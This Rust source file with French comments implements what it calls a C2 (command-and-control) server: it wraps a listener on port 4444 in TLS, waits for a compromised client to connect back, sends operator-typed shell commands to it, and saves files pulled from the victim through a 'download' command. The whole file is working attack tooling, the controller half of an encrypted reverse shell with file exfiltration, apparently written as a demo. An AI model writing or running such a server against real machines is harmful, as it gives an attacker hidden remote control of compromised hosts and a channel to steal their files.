use std::fs::File;
use std::io::{self, Read, Write, BufRead};
use std::net::TcpListener;
use native_tls::{Identity, TlsAcceptor};
use std::thread;

fn main() {
    println!("Démarrage du Serveur C2 en Rust...");

    // 1. Charger l'identité (le fichier .pfx généré à l'étape 1)
    let mut file = File::open("identity.pfx").expect("Impossible d'ouvrir identity.pfx");
    let mut identity_bytes = vec![];
    file.read_to_end(&mut identity_bytes).unwrap();
    
    let identity = Identity::from_pkcs12(&identity_bytes, "password").unwrap();
    let acceptor = TlsAcceptor::new(identity).unwrap();
    let acceptor = std::sync::Arc::new(acceptor);

    // 2. Écouter sur le port 4444
    let listener = TcpListener::bind("0.0.0.0:4444").unwrap();
    println!("[*] En écoute sur le port 4444 (TLS)...");

    // On accepte une seule connexion pour la démo (comme le script Python)
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                let acceptor = acceptor.clone();
                // Gestion de la connexion
                thread::spawn(move || {
                    let mut stream = acceptor.accept(stream).unwrap();
                    println!("[+] Client connecté !");

                    loop {
                        // A. Lire la commande depuis le clavier du serveur
                        print!("Shell> ");
                        io::stdout().flush().unwrap();
                        
                        let mut command = String::new();
                        let stdin = io::stdin();
                        stdin.lock().read_line(&mut command).unwrap();
                        let command = command.trim(); // Enlever le \n à la fin

                        if command.is_empty() { continue; }
                        if command == "exit" { break; }

                        // B. Envoyer la commande au client
                        // On rajoute \n car le client utilise read_line
                        stream.write_all(format!("{}\n", command).as_bytes()).unwrap();

                        // C. Lire la réponse
                        // On utilise un grand buffer pour récupérer le contenu
                        let mut buffer = [0; 65536]; // 64KB buffer
                        match stream.read(&mut buffer) {
                            Ok(n) => {
                                if n == 0 { break; } // Connexion fermée
                                
                                let response = String::from_utf8_lossy(&buffer[0..n]);

                                // D. Logique Spéciale DOWNLOAD
                                if command.starts_with("download") {
                                    let parts: Vec<&str> = command.split_whitespace().collect();
                                    if parts.len() >= 2 {
                                        let filename = parts[1];
                                        println!("[*] Réception du fichier '{}'...", filename);
                                        
                                        // Écriture sur le disque du serveur
                                        match File::create(filename) {
                                            Ok(mut file) => {
                                                // On écrit les données reçues dans le fichier
                                                file.write_all(buffer[0..n].as_slice()).unwrap();
                                                println!("[+] Fichier sauvegardé avec succès !");
                                            },
                                            Err(e) => println!("[-] Erreur création fichier: {}", e),
                                        }
                                    }
                                } else {
                                    // Affichage normal pour les autres commandes
                                    println!("{}", response);
                                }
                            },
                            Err(e) => {
                                println!("[-] Erreur de lecture: {}", e);
                                break;
                            }
                        }
                    }
                });
                break; // On sort de la boucle principale après une connexion (pour ce test)
            }
            Err(e) => { println!("Erreur connexion: {}", e); }
        }
    }
}